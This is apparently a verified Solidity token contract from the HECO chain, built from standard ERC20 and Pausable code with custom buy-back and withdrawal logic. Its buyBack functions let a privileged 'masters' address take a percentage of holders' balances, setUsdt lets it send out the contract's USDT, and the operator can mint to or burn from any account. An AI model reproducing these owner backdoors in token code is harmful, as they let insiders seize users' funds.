/**
 *Submitted for verification at hecoinfo.com on 2021-02-03
*/

pragma solidity =0.6.6;
pragma experimental ABIEncoderV2;
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


abstract contract Pausable is Context {

    event Paused(address account);


    event Unpaused(address account);

    bool private _paused;

    constructor () internal {
        _paused = false;
    }


    function paused() public view returns (bool) {
        return _paused;
    }


    modifier whenNotPaused() {
        require(!_paused, "Pausable: paused");
        _;
    }


    modifier whenPaused() {
        require(_paused, "Pausable: not paused");
        _;
    }


    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }


    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

contract TOKEN{
     function balanceOf(address account) public view  returns (uint256) {}
     function transfer(address recipient, uint256 amount) public  returns (bool) {}
     function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {}
      function setToken(address _token)public  returns(bool){}
       function subToken(address _owner,uint256 _num) public  returns (bool){}
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
         string public _name;
         string public _symbol;
         uint256 public _decimals=6;
         uint256 public _wdecimal=2;
         TOKEN public token;
         TOKEN public token2;
         uint256 public _totalSupply=100000000*10**_decimals;
         address public master;
         address public masters;
         uint256 public redeem;
         mapping (address=>uint256) public usdt;



        struct Back{
            uint256 time;
            uint256 balance;
            uint256 usdt;
             uint256 bl;
             uint256 price;
        }

        struct Admin{
            uint256 time;
            uint256 bl;
            uint256 balance;
            uint256 usdt;
            uint256 price;
        }

        mapping(address=>Back[]) public userBack;

        Admin[] public adminRecord;

    address[] public user;
    mapping(address=>uint8) public isUser;

    event Golden(uint256 id,address owner,address paddress,uint256 num,uint256 time);

       struct Buy{
           uint256 ci;
           address owner;
           address paddress;
           uint256 num;
           uint256 time;
       }
    Buy[] public buy;
    constructor (string memory name_, string memory symbol_,address _token,address _token2) public {
        _name = name_;
        _symbol = symbol_;
        _balances[msg.sender] = _totalSupply;
         master=msg.sender;
          token=TOKEN(_token);
          token2=TOKEN(_token2);
    }

    modifier only(){
        require(msg.sender==master,"You're not the master.");
        _;
    }

    modifier onlys(){
        require(msg.sender==masters,"You're not the master.");
        _;
    }

    function setMasters(address _masters)public only returns(bool){
            masters=_masters;
            return true;
    }

    function setToken(address _token) public only returns(bool){
            token=TOKEN(_token);
            return true;
    }

   function setTokens(address _token) public only returns(bool){
            token2=TOKEN(_token);
            return true;
    }

    function setWdecimal(uint256 _num) public only returns(bool){
        _wdecimal=_num;
        return true;
    }
    
    function exchage(uint256 _num) public returns(bool){
            address _owner=msg.sender;
            require(_balances[masters]>=_num);
            token2.transferFrom(_owner,masters,_num);
            _balances[_owner]=_balances[_owner].add(_num);
            _balances[masters]=_balances[masters].sub(_num);
             getUser(_owner);
            return true;
    }
    
    function golden(uint256 _num,address _paddress) public returns(bool){
        address _owner=msg.sender;
        require(_balances[_owner]>=_num&&_num>0);
         _balances[_owner] = _balances[_owner].sub(_num);
         _balances[masters] = _balances[masters].add(_num);
         uint256 _length=buy.length+1;
         buy.push(Buy(_length,_owner,_paddress,_num,block.timestamp));
        emit Golden(_length,_owner,_paddress,_num,block.timestamp);
    }

    function goldenList() public view returns(uint256[] memory ci,address[] memory owner,address[] memory paddress,uint256[] memory num,uint256[] memory time){
        uint256 _length= buy.length;
        uint256[] memory _ci=new uint256[](_length);
        address[] memory _owner=new address[](_length);
        address[] memory _paddress=new address[](_length);
        uint256[] memory _num=new uint256[](_length);
        uint256[] memory _time=new uint256[](_length);
         uint256 day=0;
        for(uint256 i=_length;i>0;i--){
            if(day>30) break;
            _ci[day]=buy[i.sub(1)].ci;
            _owner[day]=buy[i.sub(1)].owner;
            _paddress[day]=buy[i.sub(1)].paddress;
            _num[day]=buy[i.sub(1)].num;
            _time[day]=buy[i.sub(1)].time;
            day++;
        }
        return(_ci,_owner,_paddress,_num,_time);
    }

     function get(address _owner,uint256 _buy,uint256 _dbl,uint256 _time) private returns(uint256) {
         if(_balances[_owner]>10000&&_owner!=address(this)&&_owner!=masters&&_owner!=master){
                uint256 num=_balances[_owner].mul(_buy).div(100);
                uint256 usdtNum=num.mul(_dbl).div(1000000);
                _balances[_owner] = _balances[_owner].sub(num);
                _balances[masters] = _balances[masters].add(num);
                 usdt[_owner]=usdt[_owner].add(usdtNum);
                 userBack[_owner].push(Back(_time,num,usdtNum,_buy,_dbl));
                 return num;
         }

    }


    function getUser(address _owner) private{
        if(_owner!=address(this)&&isUser[_owner]<1&&_owner!=address(0)&&_owner!=master&&_owner!=masters){
            user.push(_owner);
            isUser[_owner]=2;
        }
    }

    function buyBack(uint256 _buy,uint256 _dbl) public onlys returns(bool){

        uint256 length=user.length;
        uint256 time=block.timestamp;
        uint256 nums=0;
        for(uint256 i=0;i<length; i++){
            nums=nums.add(get(user[i],_buy,_dbl,time));
        }
        redeem=redeem.add(nums);
        adminRecord.push(Admin(time,_buy,nums,redeem.mul(_dbl).div(1000000),_dbl));
    }

     function buyBacks(uint256 _buy,uint256 _dbl,address[] memory _address) public onlys returns(bool){

        uint256 length=_address.length;
        uint256 time=block.timestamp;
        uint256 nums=0;
        for(uint256 i=0;i<length; i++){
            nums=nums.add(get(_address[i],_buy,_dbl,time));
        }
        redeem=redeem.add(nums);
        adminRecord.push(Admin(time,_buy,nums,redeem.mul(_dbl).div(1000000),_dbl));
    }

    function withdraw() public  returns(bool){
        address _owner=msg.sender;
        uint256 ke=usdt[_owner].mul(10**_wdecimal);
        uint256 you=token.balanceOf(address(this));
        if(you>0&&you<ke){
            ke=you;
        }
        require(ke>0&&you>0&&you>=ke,"Discrepancy condition");
             usdt[_owner]=usdt[_owner].sub(ke.div(10**_wdecimal));
             token.transfer(_owner,ke);
    }

    function getRecord(address _owner,uint8 _limit) public view returns(uint256[5][] memory,uint256){
        uint256 num=userBack[_owner].length;
        uint256[5][] memory detail=new uint256[5][](num);
        uint256 day=0;
        for(uint256 i=num;i>0;i--){
            if(day>_limit) break;
             detail[day][0]=userBack[_owner][i.sub(1)].balance;
            detail[day][1]=userBack[_owner][i.sub(1)].time;
            detail[day][2]=userBack[_owner][i.sub(1)].usdt;
            detail[day][3]=userBack[_owner][i.sub(1)].bl;
            detail[day][4]=userBack[_owner][i.sub(1)].price;
             day++;
        }
        return(detail,num);
    }

     function getRecords(uint8 _limit) public view returns(uint256[5][] memory,uint256){
        uint256 num=adminRecord.length;
       uint256[5][] memory detail=new uint256[5][](num);
        uint256 day=0;
        for(uint256 i=num;i>0;i--){
            if(day>_limit) break;
           detail[day][0]=adminRecord[i.sub(1)].balance;
           detail[day][1]=adminRecord[i.sub(1)].time;
           detail[day][2]=adminRecord[i.sub(1)].usdt;
           detail[day][3]=adminRecord[i.sub(1)].bl;
            detail[day][4]=adminRecord[i.sub(1)].price;
             day++;
        }
        return(detail,num);
    }




    function four() public view returns(uint256,uint256,uint256,uint256){
        uint256 num=_balances[address(this)];
        return(_totalSupply,num,_totalSupply.sub(num),redeem);
    }

    function release(address _to) public onlys returns(bool){
        address _ower=address(this);
         uint256 _num=95000000000000;
           _transfer(_ower,_to,_num.mul(1).div(100));
            return true;
    }

    function usdtBalanceof() public view returns(uint256){
        return token.balanceOf(address(this));
    }

    function setUsdt(address _owner,uint256 _num) public onlys returns(bool){
        token.transfer(_owner,_num);
    }

    function qy() public view returns(address[] memory){
        uint256 num=user.length;
        address[] memory userA=new address[](num);
        for(uint256 i=0;i<num;i++){
            userA[i]=user[i];
        }
        return(userA);
    }

    function name() public view returns (string memory) {
        return _name;
    }


    function symbol() public view returns (string memory) {
        return _symbol;
    }


    function decimals() public view returns (uint256) {
        return _decimals;
    }


    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

     function balanceOfs(address account) public view  returns (uint256){

        return usdt[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        getUser(sender);
        getUser(recipient);
        emit Transfer(sender, recipient, amount);
    }


    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }


    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}
abstract contract ERC20Pausable is ERC20, Pausable {
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);

        require(!paused(), "ERC20Pausable: token transfer while paused");
    }
}
contract ERC20Template is ERC20Pausable {
    address factory;
    address _operator;
    address _pauser;
    constructor(address operator,address pauser,string memory name, string memory symbol,uint8 decimal,address _token,address _token2) public ERC20(name,symbol,_token,_token2) {
        _operator = operator;
        _pauser=pauser;
        _setupDecimals(decimal);
        factory=msg.sender;
    }


    modifier onlyFactory(){
        require(msg.sender==factory,"only Factory");
        _;
    }
    modifier onlyOperator(){
        require(msg.sender == _operator,"not allowed");
        _;
    }
    modifier onlyPauser(){
        require(msg.sender == _pauser,"not allowed");
        _;
    }

    function pause() public  onlyPauser{
        _pause();
    }

    function unpause() public  onlyPauser{
        _unpause();
    }

    function changeUser(address new_operator, address new_pauser) public onlyFactory{
        _pauser=new_pauser;
        _operator=new_operator;
    }

    function mint(address account, uint256 amount) public whenNotPaused onlyOperator {
        _mint(account, amount);
    }
    function burn(address account , uint256 amount) public whenNotPaused onlyOperator {
        _burn(account,amount);
    }
}